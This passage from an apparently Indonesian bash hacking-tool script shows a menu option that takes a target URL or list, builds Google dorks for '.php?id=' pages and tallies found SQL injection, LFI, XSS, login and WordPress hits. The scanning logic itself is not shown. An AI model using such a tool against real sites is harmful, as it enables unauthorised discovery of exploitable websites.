       done
       menu

    else
      echo "masukan input dengan benar :("
      sleep 3
      menu
    fi
elif [ $input = "4" ] || [ $input = "04" ];
then
       printf "\033[31;1m[\033[32;1m1\033[31;1m]\033[37;1m scaning sqli, xss, lfi \n"
       sleep 0
       printf "\033[31;1m[\033[32;1m2\033[31;1m]\033[37;1m scaning sqli, xss, lfi all\n"
       sleep 0
       read -p "$(printf "\033[31;1m[\033[32;1m*\033[31;1m]\033[37;1m choice : "'\033[34;1m')" x
       echo
         if [ $x = "1" ] || [ $x = "01" ];
         then
           hekel="y"
           clear
           logo
           read -p "$(printf "\033[31;1m[\033[32;1m*\033[31;1m]\033[37;1m target url : "'\033[34;1m')" site
           dork=".php%3Fid%3D+site%3a$site"
           pa="1"
           rm -rf .result_dork .not .url .vuln .bad .wp .live
           trap break INT
           dora #$result_vuln
           trap - INT
           echo -e "${N}[${R}+${N}] Done.....\n[${G}+${N}] Result found saved ${G}output/$dir/${N}"
           echo -e "[${G}+${N}] Result Total : ${G}\033[2m$(cat .live 2>/dev/null | wc -l) Login page${N}"
           echo -e "[${O}!${N}] Result Total : ${O}\033[2m$(cat .wp 2>/dev/null | wc -l) WordPress${N}"
           echo -e "[${R}!${N}] Result Total : ${R}\033[2m$(cat .bad 2>/dev/null | wc -l) Not found${N}"
           echo -e "[${G}+${N}] Result Total : ${G}\033[2m$(cat output/$dir/inject_point.txt 2>/dev/null | wc -l) Sqli vuln${N}"
           echo -e "[${O}!${N}] Result Total : ${O}\033[2m$(cat output/$dir/lfi.txt 2>/dev/null | wc -l) LFI${N}"
           echo -e "[${R}!${N}] Result Total : ${BL}\033[2m$(cat output/$dir/xss.txt 2>/dev/null | wc -l) xss${N}"
           menu

          elif [ $x = "2" ] || [ $x = "02" ];
          then
            hekel="y"
            clear
            logo
            read -p "$(printf "\033[31;1m[\033[32;1m*\033[31;1m]\033[37;1m target list : "'\033[34;1m')" list
            rm -rf .result_dork .not .url .vuln .bad .wp .live
            trap break INT
            for site in $(cat $list 2>/dev/null | sed 's/\r$//' | tr -d "\0" );do
            dork=".php%3Fid%3D+site%3a$site"
            pa="1"
            dora #$result_vuln
            echo -e "${N}[${R}+${N}] Done.....\n[${G}+${N}] Result found saved ${G}output/$dir/${N}"
            echo -e "[${G}+${N}] Result Total : ${G}\033[2m$(cat .live 2>/dev/null | wc -l) Login page${N}"
            echo -e "[${O}!${N}] Result Total : ${O}\033[2m$(cat .wp 2>/dev/null | wc -l) WordPress${N}"
            echo -e "[${R}!${N}] Result Total : ${R}\033[2m$(cat .bad 2>/dev/null | wc -l) Not found${N}"
            echo -e "[${G}+${N}] Result Total : ${G}\033[2m$(cat output/$dir/inject_point.txt 2>/dev/null | wc -l) Sqli vuln${N}"
            echo -e "[${O}!${N}] Result Total : ${O}\033[2m$(cat output/$dir/lfi.txt 2>/dev/null | wc -l) LFI${N}"
            echo -e "[${R}!${N}] Result Total : ${BL}\033[2m$(cat output/$dir/xss.txt 2>/dev/null | wc -l) xss${N}"
            done
            trap - INT
            menu

         else
           echo "masukan input dengan benar :("
           sleep 3
           menu
         fi


fi
}

start
